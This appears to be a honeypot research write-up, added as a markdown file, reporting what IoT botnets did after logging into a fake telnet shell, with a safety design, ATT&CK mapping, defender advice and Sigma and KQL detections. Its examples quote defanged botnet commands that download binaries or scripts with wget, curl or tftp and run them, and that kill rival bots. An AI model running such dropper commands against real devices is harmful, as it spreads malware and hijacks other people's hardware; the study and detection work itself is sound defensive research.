@@ -1,0 +1,345 @@
+# What IoT botnets do after logging in: a telnet honeypot in Rust
+
+[Timothy Fletcher](https://timfletcher.tech) · November 2026 · Data from 2026-11-03 01:29 UTC to 2026-11-06 15:34 UTC (86 hours)
+
+## Summary
+
+- **What I built:** a medium-interaction telnet honeypot in Rust, run on Google Cloud for 86
+  hours. 18 common factory-default logins get into a shell that's entirely fake. Every reply is
+  fixed text compiled into the program, and nothing a visitor sends is ever run or fetched.
+- **What I found:** 481 of 2,450 connections logged in and sent 1,772 commands, including 13
+  attempts to download and run malware. None of them produced an outbound connection. Most bots
+  followed the same playbook, mapped below to MITRE ATT&CK.
+- **What it shows:** a fixed-reply shell is safe but easy to spot. Almost every bot that checked
+  for its own marker word left before the payload stage. Silent visitors fell from 82% to 12%
+  after the server began opening with telnet negotiation, but the IP address changed at the same
+  moment, so that cause isn't proven.
+
+| Headline | Value |
+| --- | --- |
+| Time live | 86 hours, one server, port 23 only |
+| Connections | 2,450 from 364 IP addresses |
+| Logins into the fake shell | 481 from 152 IP addresses |
+| Commands | 1,772, of which 74 were different |
+| Download attempts | 13 sessions from 7 IPs, naming 7 different addresses |
+| Outbound connections made by the honeypot | **0** |
+| Crashes, restarts, program errors | 0, 0, 0 |
+| Visits that sent nothing at all | 12%, down from 82% before the telnet opening |
+| Data sent by the server | 0.5 to 1.0 MB a day |
+| Automated tests | 290 passing, 17 of them guarding the safety rules |
+
+## Architecture and safety design
+
+The program is about 6,600 lines of Rust, including tests, with three dependencies (`chrono`,
+`serde`, `serde_json`). It runs on a single e2-micro sized for Google Cloud's Free Tier, built by
+Terraform ([deploy/gcp/main.tf](deploy/gcp/main.tf)).
+
+```text
+Internet ── TCP 23 ──▶ Google Cloud firewall ──▶ Debian 13 e2-micro
+                        in:  23 from anywhere      nftables: 23 redirected to 2323,
+                             22 from IAP only      default drop in and out,
+                        out: deny all, logged      honeypot user gets no outbound at all
+                                                         │
+                                                         ▼
+                                        honeypot (Rust, unprivileged, systemd sandbox)
+                                        fake login ─▶ fake shell with fixed replies
+                                                         │
+                                                         ▼
+                                        JSON-lines logs, private, deleted after 30 days
+                                                         │  copied once a day over IAP SSH
+                                                         ▼
+                                        deploy/daily-logs.sh: counts only, automatic STOP checks
+```
+
+Each layer assumes the one above it has failed.
+
+| Layer | What it does | How it was checked |
+| --- | --- | --- |
+| Code ([src/fake_shell.rs](src/fake_shell.rs)) | Replies have the type `&'static str`, so the compiler refuses to send back anything a visitor typed. Downloads get a believable failure such as `-sh: Network is unreachable`. The code has no HTTP client, name lookup or process API, and `#![forbid(unsafe_code)]` is set | 17 `guard_` tests that must always pass, for example that the shell's file can't reach files, programs or the network, and that no new crate appears. Another test aims every kind of download at a real listener and checks that nothing connected |
+| Process ([deploy/host/honeypot.service](deploy/host/honeypot.service)) | Unprivileged user, no capabilities, `NoNewPrivileges`, `ProtectSystem=strict`, `MemoryDenyWriteExecute`, a syscall filter, IPv4 only, 256 MB memory and 50% CPU caps | Restart count and memory peak (2.4 MB) in the daily summary |
+| noexec ([deploy/host/honeypot-shell.conf](deploy/host/honeypot-shell.conf)) | `NoExecPaths=/` with `ExecPaths=/opt/honeypot`: even if a bug tried to start a program, the only folder it could run one from is the honeypot's own | Read the running process's mount table before opening the port and saw `noexec`. Daily: 0 other programs run by the honeypot user, 0 files it owns outside its logs |
+| Host firewall ([deploy/host/nftables.conf](deploy/host/nftables.conf)) | Default drop. Every new outbound connection from the honeypot user is logged and dropped, with no exceptions. DNS is blocked, so data can't be smuggled out in lookups. This layer also covers the metadata server, which cloud firewall rules don't | An outbound test to `1.1.1.1:443` was blocked |
+| Cloud firewall | Only TCP 23 is open to the internet. SSH is reachable only from Google's IAP range, never on the public IP. Egress is denied and logged | The same outbound test with the host firewall off was blocked. From outside, ports 22 and 2323 were closed |
+| Cloud identity | No service account, so the server has no Google Cloud permissions. Serial port off, project-wide SSH keys blocked | Set in Terraform, which has no `service_account` block |
+| Limits | 64 connections, 4 per IP, 60 visits a minute, 30 seconds per visit. Each session is capped at 200 lines, 64 KB stored and 8 KB of replies. The shell has a 20 MB daily budget and logging a 100 MB one | "Refused by the limits" and data sent, in the daily summary |
+| Operations ([deploy/daily-logs.sh](deploy/daily-logs.sh)) | A daily script copies the logs, prints only counts and prints STOP, with the reason, if any rule is broken. The kill switch is deleting one firewall rule | Ran with no STOP on 2026-11-06 |
+
+**Egress results, Nov 3 to Nov 6:**
+
+| Check | Result |
+| --- | --- |
+| Outbound attempts by the honeypot user (host firewall log) | 0, despite 88 download addresses (7 unique) sent to it |
+| Other blocked outbound lines | 5, all from the planned admin self-test at launch |
+| Cloud firewall egress log | 0 hits |
+| Data sent per day, by Google's own count | 0.5 to 1.0 MB |
+
+## How I built it
+
+I learned Rust while building this, through staged exercises set up by Claude Code. I wrote the
+exercise code; when I got stuck, Claude Code helped debug and fixed parts of two exercises at my
+request. It also wrote the scaffolding, the tests, the deployment scripts and the log analysis,
+and drafted this report from that analysis. I reviewed every change before it reached the
+server, made each safety and data-handling decision myself, and can explain how each layer works.
+
+## Findings: the post-login playbook
+
+Of 2,450 connections, 2,132 (87%) sent a login, 481 were accepted, 414 of those sessions sent at
+least one command, and 13 (2.7% of sessions) reached a download. Sessions ended in two ways: 289
+hung up and 192 waited until the 30-second limit.
+
+| Step | What bots sent (masked) | MITRE ATT&CK | Lines | IPs |
+| --- | --- | --- | --- | --- |
+| Log in with factory defaults | Common usernames such as `root`, `admin`, `default`, `support` | T1110.001 Password Guessing, T1078.001 Default Accounts | 2,132 logins | 152 got in |
+| Break out of a router's limited menu | `enable`, `system`, `shell`, `sh`, `linuxshell` | T1059.008 Network Device CLI, T1059.004 Unix Shell | 1,082 | 92 |
+| Try a router CLI | `config terminal`, `start`, `su` | T1059.008 Network Device CLI | 240 | 25 |
+| Inject a shell into a ping tool | `ping ;sh`, also sent as `ping; sh` and `ping;sh` | T1059.004 Unix Shell | 64 | 48 |
+| Look around | `uname -m`, `cat /proc`, `cat /etc/passwd`, `id`, `ls /home` | T1082, T1087.001, T1033, T1083 | 177 | 50 |
+| Find a writable folder, then check with a hex `echo` | `>/var/run/.x&&cd /var/run;…` (below) | T1083 File and Directory Discovery | 80 | 25 |
+| Check for a real BusyBox | `/bin/busybox SORA` | T1497.001 System Checks (closest fit) | 29 | 11 |
+| Check that `echo` works | Hex `echo -e` markers, `echo PAYLOAD_WORKING` | T1497.001 System Checks (closest fit) | 13 | 9 |
+| The `SHELL_TEST` check | `echo SHELL_TEST`, then hang up | T1497.001 System Checks (closest fit) | 47 | 3 |
+| Download and run | `wget`, `curl` and `tftp` fallbacks, `chmod 777`, run in the background | T1105 Ingress Tool Transfer, T1222.002, T1059.004 | 13 | 7 |
+| Remove rival bots | `killall -9` a list of other botnets' names | T1489 Service Stop (closest fit) | 1 | 1 |
+| Clean up | Delete the script after running it | T1070.004 File Deletion | 1 | 1 |
+
+Examples, masked and defanged. IPs keep only their first two numbers, and IDs or file names that
+could identify this honeypot are replaced with `<id>` and `<name>`. Long lines are shortened with
+`…`.
+
+```text
+# The writable-folder probe. The 6-letter marker is random, with 25 variants seen
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;…;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x47\x4a\x4e\x4e\x4f'
+
+# BusyBox checks with a made-up "applet", often a botnet's name: SORA, YAKUZA, KYTON, V3G4, Cult, UNSTABLE, HISILICON, BOTNET
+/bin/busybox SORA
+
+# Hex echo markers. These two decode to auth_ok and redtail_bot_telnet_ok
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B"
+
+# The most repeated dropper: one line fetching builds for three CPU types, each with three fallbacks
+cd /tmp || cd /var || cd /dev/shm || cd /mnt; (wget -q -O main_arm7 hxxp://201[.]79[.]x[.]x:8081/main_arm7 || curl -s -O hxxp://201[.]79[.]x[.]x:8081/main_arm7 || tftp -g -r main_arm7 201[.]79[.]x[.]x 69) 2>/dev/null; chmod 777 main_arm7; nohup ./main_arm7 arm7 >/dev/null 2>&1 & … (repeated for main_mips and main_mpsl)
+
+# Fetch a script and pipe it straight into a shell, telling it how it got in
+(wget --no-check-certificate -qO- hxxps://217[.]60[.]x[.]x/sh || curl -sk hxxps://217[.]60[.]x[.]x/sh) | sh -s telnet
+
+# Kill rival bots, delete other programs from temporary folders, then fetch, run and delete a script
+busybox sh -c 'for p in mirai sora mozi hajime tsunami gafgyt yakuza owari josho ECCHI; do killall -9 $p 2>/dev/null; done; … wget -q -O <name>.sh hxxp://168[.]220[.]x[.]x:9087/payload/<id>/<name>.sh … sh <name>.sh; rm -f <name>.sh'
+```
+
+**What stands out**
+
+- **Most bots check before they commit, and a fixed-reply shell fails the check.** 165 of the 414
+  sessions with commands ran a check that only a real shell passes, because it needs the bot's own
+  word repeated back. The honeypot never repeats input, by design: `echo` gets a blank line, and
+  `/bin/busybox SORA` gets `busybox: applet not found` where a real device would say
+  `SORA: applet not found`. 161 of those 165 sessions ended on a check without trying a
+  download. Only 4 went on to download anyway.
+- **The playbook is old and stable.** Mirai's leaked source sends `enable`, `system`, `shell` and
+  `sh` after logging in, then `/bin/busybox <WORD>`
+  ([source code review](https://medium.com/@cjbarker/mirai-ddos-source-code-review-57269c4a68f)).
+  Variants keep the same strings with their own word: a string table extracted by
+  [miraicfg](https://github.com/FernandoDoming/miraicfg) holds `/bin/busybox JOSHO` and the reply
+  it waits for, `JOSHO: applet not found`. Here, 54 sessions opened with exactly `enable`,
+  `system`, `shell`, `sh`, then `linuxshell`. The family names in this data come only from the
+  bots' own strings. No samples were fetched, so the families aren't confirmed.
+- **Bots compete for devices.** One dropper tries to kill ten rival botnets by name and deletes
+  other programs from the temporary folders before installing its own.
+- **Droppers plan for failure.** Every one had a chain of fallbacks, such as `wget`, then
+  `curl`, then `tftp`. Two passed `telnet` to their payload, most likely to record how they got
+  in.
+- **An open question.** 47 sessions from 3 IPs, all on Nov 3 and 4, logged in, sent only
+  `echo SHELL_TEST`, received a blank line and hung up. The likeliest explanation is that they
+  wanted the word back, but a bot that only checks logins and reports them elsewhere would look the
+  same. A fixed reply for that one command is written and tested, but not yet deployed.
+
+## What defenders should do
+
+Every step of the playbook above depends on something a network owner controls.
+
+1. **Block inbound telnet (23 and 2323) at the edge.** 87% of connections here sent a login,
+   and an open telnet port was all any of these bots needed to start.
+2. **Change factory-default logins before a device is deployed.** 18 common defaults were enough
+   for 481 logins from 152 IPs in 86 hours.
+3. **Put IoT devices on their own network segment, with outbound traffic restricted to what they
+   need.** Every dropper here had to fetch its payload from a raw IP address, over ports 80, 443,
+   8081 and 9087 or over TFTP. An outbound allow-list would have stopped every download in this
+   data, as this honeypot's own firewalls did.
+4. **Alert on new outbound connections from IoT devices.** These devices talk to a small, fixed
+   set of servers, so a connection to an unfamiliar address is worth a look, especially within
+   minutes of an inbound login. Detection 3 below does this from firewall logs.
+
+## The telnet opening: result and caveat
+
+**Why it was added.** In the day before the shell, the honeypot only showed a login prompt, and
+82% of visits sent nothing at all. 241 of those silent visits came from 11 IPs with the same
+rhythm: connect, stay silent for about 8 seconds, hang up, and try again about 5 seconds later.
+Real devices start telnet negotiation as soon as a client connects, and
+[ignoring negotiation is a known way to spot a honeypot](https://www.cl.cam.ac.uk/~amv42/papers/vetterl-clayton-bitter-harvest-woot-18-slides.pdf).
+The hypothesis was that these bots were waiting for the server to speak first, so the shell
+release starts every connection with the negotiation a small device would send.
+
+| | Before: 24 hours, fake login only | After: Nov 3 to Nov 6, opening and shell |
+| --- | --- | --- |
+| Visits | 520 | 2,450 (713 in the first 24 hours) |
+| Sent nothing at all | 425 (82%) | 284 (12%). First 24 hours: 99 (14%) |
+| Sent nothing, leaving out the 11 retry IPs | 184 of 279 (66%) | Not applicable: they never returned |
+| Sent a login | 81 (16%) | 2,132 (87%) |
+| Answered the telnet negotiation | Not offered | 1,994 (81%) |
+| IPs showing the silent retry rhythm | 11 | 0 on every day |
+| The 7 IPs seen in both periods | 44 of 109 visits silent (40%) | 35 of 434 visits silent (8%) |
+
+Silent visits stayed between 8% and 13% on each calendar day.
+
+**The caveat.** Turning on the shell meant reinstalling the server, and the reinstall gave it a
+new public IP address. None of the 11 retry IPs ever reached the new address, so for the bots that
+motivated the change, the result is unknown. The rest of the visitor population also changed at
+the same moment as the behaviour: only 7 of the 117 IPs from the day before were seen again.
+Those 7 point the same way, but 7 is too few to carry the claim, and the baseline is a single
+day. What the data supports: silent
+visits fell sharply after the change and stayed low for four days. The opening is the likeliest
+cause, but this setup can't separate it from the new address.
+
+## Detection ideas
+
+These come from the patterns above, and none has been run against production telemetry yet. Most
+IoT devices can't run an endpoint agent, so the two Sigma rules suit Linux servers and appliances
+that log process starts (auditd or eBPF), while the KQL query works from firewall logs, which do
+see IoT devices.
+
+**1. BusyBox started with a made-up applet name (Sigma).** Real applet names are lower case.
+Bots use an upper-case word to test for a real BusyBox.
+
+```yaml
+title: BusyBox Started With an Upper-Case Word Instead of an Applet
+id: 49d81c14-1dc7-451f-8515-05d2f6bf4e89
+status: experimental
+description: >
+  Detects BusyBox run with an upper-case word where an applet name belongs, such as
+  "/bin/busybox SORA". IoT bots send this right after logging in and expect
+  "SORA: applet not found" back, which tells them the shell is real.
+author: Timothy Fletcher
+date: 2026-11-06
+tags:
+  - attack.discovery
+  - attack.t1082
+  - attack.defense-evasion
+  - attack.t1497.001
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    Image|endswith: '/busybox'
+    CommandLine|re: 'busybox [A-Z][A-Za-z0-9]{2,}'
+  condition: selection
+falsepositives:
+  - Unlikely, since real BusyBox applet names are lower case
+level: high
+```
+
+**2. A download tool fetches a CPU-named binary or a piped script from a bare IP (Sigma).** All 7
+download addresses in the data used a raw IP. Most named the file after a CPU type, sat under
+`/bins/`, or were piped straight into `sh`.
+
+```yaml
+title: Download Tool Fetches a CPU-Named Binary or Piped Script From a Bare IP Address
+id: 2d2e6608-74b8-4e82-8dbc-15bfed00844b
+status: experimental
+description: >
+  Detects wget, curl, tftp or BusyBox fetching from a raw IPv4 address where the file is
+  named after a CPU type (arm7, mips, mpsl and so on), sits under /bins/, or is written to
+  standard output for a shell. IoT droppers on a telnet honeypot fetched their payloads this way.
+author: Timothy Fletcher
+date: 2026-11-06
+tags:
+  - attack.command-and-control
+  - attack.t1105
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection_tool:
+    Image|endswith:
+      - '/wget'
+      - '/curl'
+      - '/tftp'
+      - '/busybox'
+  selection_bare_ip:
+    CommandLine|re: '(^|[\s/@])\d{1,3}(\.\d{1,3}){3}([\s:/]|$)'
+  selection_payload:
+    - CommandLine|re: '[_./-](arm[4-7]?|mips|mpsl|mipsel|m68k|ppc|sh4|spc|x86|i[3-6]86)(\s|$)'
+    - CommandLine|contains:
+        - '/bins/'
+        - '-qO-'
+        - '-O- '
+  condition: all of selection_*
+falsepositives:
+  - Internal package mirrors reached by IP address that serve one build per CPU type
+level: medium
+```
+
+**3. Telnet allowed in from the internet, then the device starts connecting out (KQL, Microsoft
+Sentinel).** In this data, every download command came less than 30 seconds after the connection
+opened. On a real network, that pair is the moment a device joins a botnet.
+
+```kql
+// Inbound telnet from the internet reached an internal host, and within 10 minutes that host
+// connected out to the internet. DeviceAction values differ by firewall vendor, so adjust the list.
+let lookback = 1d;
+let telnet_in = CommonSecurityLog
+    | where TimeGenerated > ago(lookback)
+    | where DestinationPort in (23, 2323)
+    | where DeviceAction in~ ("allow", "accept", "permit", "allowed", "accepted")
+    | where ipv4_is_private(DestinationIP) and not(ipv4_is_private(SourceIP))
+    | project InTime = TimeGenerated, Device = DestinationIP, Attacker = SourceIP;
+let outbound = CommonSecurityLog
+    | where TimeGenerated > ago(lookback)
+    | where DeviceAction in~ ("allow", "accept", "permit", "allowed", "accepted")
+    | where ipv4_is_private(SourceIP) and not(ipv4_is_private(DestinationIP))
+    | where DestinationPort !in (53, 123)
+    | project OutTime = TimeGenerated, Device = SourceIP, Remote = DestinationIP, DestPort = DestinationPort;
+telnet_in
+| join kind=inner outbound on Device
+| where OutTime between (InTime .. (InTime + 10m))
+| summarize Attackers = dcount(Attacker), FirstSeen = min(InTime),
+    Destinations = make_set(strcat(Remote, ":", tostring(DestPort)), 20) by Device
+| order by Attackers desc
+```
+
+## Limits
+
+- **Short and narrow.** 86 hours, one IP address in one cloud region, telnet only. Cloud address
+  ranges attract their own mix of scanners, so these numbers may not match a home or business
+  network.
+- **The fake shell is easy to spot.** That's a deliberate trade for safety, but it means the
+  data shows the first steps of an attack much better than what comes after the download.
+- **No malware samples.** By design the honeypot never fetches an address, so there are no file
+  hashes, and family names rest on the bots' own strings.
+- **Time wasted isn't measured.** Each log line records when a visit started, not when it ended.
+  The 30-second cap gives an upper bound, and 192 sessions ran into it.
+- **The telnet result is confounded** by the change of address, as described above, and its
+  baseline is one day.
+- **Monitoring is daily, not continuous.** The STOP checks run when the daily script runs. Logs
+  stay on the server until they're copied, and there's no separate log collector.
+- **Data handling** decisions (30-day retention, private storage, masking before anything is
+  shared) were made without a legal review.
+- **The detection rules** haven't been tested against real telemetry.
+
+## Next steps
+
+1. Deploy the fixed `SHELL_TEST` reply, which is already written and tested, to see whether those
+   bots go further when the word comes back. Reinstalling changes the address again, so they may
+   not return.
+2. Record when each session ends, so time wasted can be measured instead of bounded.
+3. Test the telnet opening on a single address by switching the shell, and with it the opening,
+   off for a day and back on, without reinstalling.
+4. Keep collecting until the planned one to two weeks, then report abusive IPs to AbuseIPDB with
+   no log contents, as already decided.
+5. Convert the Sigma rules with `sigma-cli` and test all three detections against synthetic
+   events, never by running a logged command.
+6. Carry on with the roadmap: a fake web service with full request logging, then an offline
+   report tool for the downloaded logs.
+
+*How the examples were prepared: every value in this report is a count or a masked pattern. Raw
+logs are never published, nothing in them is run or opened, and they're deleted after 30 days.*
